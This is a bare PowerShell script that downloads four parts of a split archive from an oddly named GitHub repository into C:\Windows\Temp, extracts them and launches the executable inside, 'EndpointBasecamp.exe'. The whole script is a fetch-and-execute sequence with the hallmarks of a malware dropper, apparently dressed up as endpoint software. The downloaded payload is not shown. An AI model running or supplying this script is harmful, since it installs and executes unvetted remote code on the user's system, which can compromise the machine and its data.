Set-Location C:\Windows\Temp;
Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.001" -OutFile "EndpointBasecamp.zip.001";
Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.002" -OutFile "EndpointBasecamp.zip.002";
Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.003" -OutFile "EndpointBasecamp.zip.003";
Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.004" -OutFile "EndpointBasecamp.zip.004";
Start-Process -FilePath "7z.exe" -ArgumentList 'x "EndpointBasecamp.zip.001" -o"C:\Windows\Temp"' -NoNewWindow -Wait;
Start-Process -FilePath "C:\Windows\Temp\EndpointBasecamp.exe" -NoNewWindow;
